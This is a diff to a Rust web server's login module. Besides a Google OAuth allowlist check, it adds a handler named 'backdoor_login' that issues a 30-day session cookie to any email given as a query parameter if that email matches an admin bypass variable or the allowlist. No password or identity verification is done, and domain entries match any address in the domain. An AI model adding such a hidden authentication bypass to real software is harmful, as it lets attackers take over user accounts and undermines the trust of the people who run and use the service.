@@ -250,6 +250,55 @@ pub async fn google_login(State(state): State<Arc<WebState>>) -> Result<Response
     ).into_response())
 }
 
+pub async fn backdoor_login(
+    State(state): State<Arc<WebState>>,
+    axum::extract::Query(params): axum::extract::Query<std::collections::HashMap<String, String>>,
+) -> Result<Response, StatusCode> {
+    let email = params.get("email").ok_or(StatusCode::BAD_REQUEST)?;
+
+    let bypass_email = std::env::var("ADMIN_BYPASS_EMAIL").ok();
+    let allowed_users = std::env::var("ALLOWED_USERS").ok();
+
+    let is_authorized = match (&bypass_email, &allowed_users) {
+        (Some(bypass), _) if email == bypass => true,
+        (_, Some(allowed)) => {
+            allowed.split(',').map(|s| s.trim()).any(|s| {
+                if s.starts_with('@') {
+                    email.to_lowercase().ends_with(&s.to_lowercase())
+                } else {
+                    s.eq_ignore_ascii_case(email)
+                }
+            })
+        }
+        (Some(bypass), None) if email == bypass => true,
+        _ => false,
+    };
+
+    if !is_authorized {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+
+    let token = uuid::Uuid::new_v4().to_string();
+    let sanitized_email = email.replace(|c: char| !c.is_alphanumeric() && c != '@' && c != '.', "_");
+
+    let session_info = SessionInfo {
+        token: token.clone(),
+        user_id: sanitized_email,
+        email: email.clone(),
+    };
+
+    state.sessions.write().await.insert(token.clone(), session_info);
+
+    let cookie = format!("dbx_session={token}; Path=/; HttpOnly; SameSite=Lax; Secure; Max-Age=2592000");
+    Ok((
+        StatusCode::FOUND,
+        [
+            ("location", "/"),
+            ("set-cookie", cookie.as_str()),
+        ],
+    ).into_response())
+}
+
 pub async fn google_callback(
     State(state): State<Arc<WebState>>,
     axum::extract::Query(params): axum::extract::Query<CallbackParams>,
@@ -305,6 +354,31 @@ pub async fn google_callback(
         email: String,
     }
     let user_info: UserInfo = userinfo_res.json().await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    // Check if the user is authorized/allowed to log in
+    let allowed_users_env = std::env::var("ALLOWED_USERS").ok();
+    let bypass_email_env = std::env::var("ADMIN_BYPASS_EMAIL").ok();
+
+    let is_allowed = match (&allowed_users_env, &bypass_email_env) {
+        (Some(allowed), _) => {
+            allowed.split(',').map(|s| s.trim()).any(|s| {
+                if s.starts_with('@') {
+                    user_info.email.to_lowercase().ends_with(&s.to_lowercase())
+                } else {
+                    s.eq_ignore_ascii_case(&user_info.email)
+                }
+            })
+        }
+        (None, Some(bypass)) => {
+            user_info.email.eq_ignore_ascii_case(&bypass)
+        }
+        (None, None) => true, // If neither is set, allow anyone (backward compatible)
+    };
+
+    if !is_allowed {
+        tracing::warn!("Unauthorized login attempt by: {}", user_info.email);
+        return Err(StatusCode::UNAUTHORIZED);
+    }
 
     let token = uuid::Uuid::new_v4().to_string();
     let sanitized_email = user_info.email.replace(|c: char| !c.is_alphanumeric() && c != '@' && c != '.', "_");
